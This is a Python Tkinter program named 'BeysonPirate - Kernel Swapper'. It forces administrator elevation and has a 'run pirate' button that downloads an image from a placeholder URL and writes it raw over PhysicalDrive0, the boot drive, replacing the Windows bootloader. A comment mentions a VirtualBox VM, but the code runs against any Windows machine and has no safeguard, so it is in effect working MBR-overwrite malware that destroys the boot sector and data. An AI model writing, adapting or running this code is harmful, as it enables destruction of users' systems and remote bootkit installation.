import tkinter as tk
import os
import ctypes
import sys
import urllib.request  # Added for downloading
from ctypes import wintypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable,
        " ".join(f'"{arg}"' for arg in sys.argv),
        None, 1
    )

if sys.platform == "win32":
    if not is_admin():
        elevate()
        sys.exit()

def run():
    # --- 1. DOWNLOAD THE KERNEL ---
    # Replace this URL with the direct link to your kernel.img
    kernel_url = "https://example.com/your_kernel.img"
    
    print("Downloading kernel image...")
    try:
        with urllib.request.urlopen(kernel_url) as response:
            kernel_data = response.read()
        print(f"Downloaded {len(kernel_data)} bytes.")
    except Exception as e:
        print(f"Download failed: {e}")
        return

    # --- 2. SETUP THE SYSTEM BRIDGE ---
    dll = type('DLL', (), {})()
    dll.Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    # Define types to prevent memory crashes
    dll.Kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
    dll.Kernel32.CreateFileW.restype = wintypes.HANDLE
    dll.Kernel32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    dll.Kernel32.WriteFile.restype = wintypes.BOOL

    # --- 3. OVERWRITE THE DRIVE ---
    # Opening PhysicalDrive0 (The Boot Drive)
    hDevice = dll.Kernel32.CreateFileW(r'\\.\PhysicalDrive0', 0x40000000, 0x01 | 0x02, None, 3, 0, 0)

    if hDevice != wintypes.HANDLE(-1).value:
        written = wintypes.DWORD(0)
        
        # We write the downloaded kernel_data instead of the old hex string
        success = dll.Kernel32.WriteFile(
            hDevice, 
            kernel_data, 
            len(kernel_data), 
            ctypes.byref(written), 
            None
        )
        
        if success:
            print("Successfully replaced Windows bootloader with custom kernel.")
            print("You can now restart the VirtualBox VM.")
        else:
            print(f"Write failed. Error: {ctypes.get_last_error()}")
            
        dll.Kernel32.CloseHandle(hDevice)
    else:
        print(f"Failed to open drive. Error: {ctypes.get_last_error()}")

# UI Setup
root = tk.Tk()
root.title("BeysonPirate - Kernel Swapper")
root.geometry("240x120")
root.resizable(False, False)
root.configure(bg="#f9f9f8")

tk.Button(root, text="run pirate", command=run,
          font=("Helvetica", 14), padx=28, pady=10,
          bg="#1a1a1a", fg="#f9f9f8", relief="flat",
          cursor="hand2", activebackground="#1a1a1a",
          activeforeground="#f9f9f8").pack(expand=True)

root.mainloop()
